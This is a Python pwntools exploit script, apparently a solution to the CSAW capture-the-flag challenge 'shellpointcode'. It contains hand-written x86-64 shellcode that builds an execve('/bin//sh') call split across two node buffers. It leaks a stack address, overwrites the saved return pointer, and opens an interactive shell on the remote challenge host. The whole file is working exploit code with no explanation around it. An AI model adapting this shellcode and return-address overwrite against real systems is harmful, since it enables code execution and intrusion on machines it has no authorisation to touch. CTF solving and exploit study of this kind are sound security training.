#!/usr/bin/env python3
#
import sys

from pwn import *


def text_for_node1(r):
    r.recvuntil(b'node 1:  \n')
    node1_text  = b''
    node1_text += b'\x52'                          # push   %rdx
    node1_text += b'\x57'                          # push   %rdi
    node1_text += b'\x48\x89\xe6'                  # mov    %rsp, %rsi
    node1_text += b'\xb0\x3b'                      # mov    $0x3b, %al
    node1_text += b'\x0f\x05'                      # syscall
    node1_text += b'\x90'*(16 - len(node1_text))   # padding, remember input size is 15
    return r.sendline(node1_text)


def text_for_node2(r):
    r.recvuntil(b'node 2: \n')
    node2_text  = b''
    node2_text += b'\x90'*5                 # padding, overwrited by payload
    node2_text += b'\x48\xc1\xeb\x08'       # shr    $0x8, %rbx
    node2_text += b'\x53'                   # push   %rbx
    node2_text += b'\x48\x89\xe7'           # mov    %rsp, %rdi
    node2_text += b'\xeb\x11'               # jmp 19 to node1->buffer
    return r.sendline(node2_text)


def get_node1_next(r):
    r.recvuntil(b'node.next: ')
    a = r.recvuntil(b'\n').strip()
    addr = int(a, 16)
    return addr


def send_payload(r, save_rip):
    r.recvuntil(b'initials?')

    payload = b''
    payload += b'\x90'*3
    payload += b'\x48\x31\xd2'                              # xor    %rdx, %rdx
    payload += b'\x90\x90'                                  # padding
    payload += b'\xeb\x09' + b'\x90'                        # jmp 11 through save_rip
    payload += p64(save_rip - 8)                            # jump back to buffer
    payload += b'\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68'  # mov $0x68732f6e69622f2f, %rbx
    payload += b'\xeb\x01'                                  # jmp 3 through null byte

    if b'\x00' in payload:
        raw_input('[+] pause null!')

    if  b'\n' in payload:
        raw_input('[+] pause newline!')

    # assert(len(payload) <= 0x20)

    return r.sendline(payload)


def get_process():
    r = None
    if len(sys.argv) >= 2 and sys.argv[1] == '--debug':
        bin_args = ['./shellpointcode']
        r = process(bin_args)
    else:
        s_host = 'pwn.chal.csaw.io'
        s_port = 9005
        r = remote(s_host, s_port)
    return r


def main():
    OFFSET_node2_rip =  0x7fffffffe250 - 0x7fffffffe248  # node->next - goodbye:rip
    r = get_process()
    text_for_node1(r)
    text_for_node2(r)

    ADDR_node1_next = get_node1_next(r) # @ nononode:rbp-0x20
    log.info("ADDR_node1_next       : 0x%x" % (ADDR_node1_next))

    ADDR_goodbye_save_rip = ADDR_node1_next - OFFSET_node2_rip
    log.info("ADDR_goodbye_save_rip : 0x%x" % (ADDR_goodbye_save_rip))

    send_payload(r, ADDR_goodbye_save_rip)
    r.interactive()


if __name__ == '__main__':
    main()

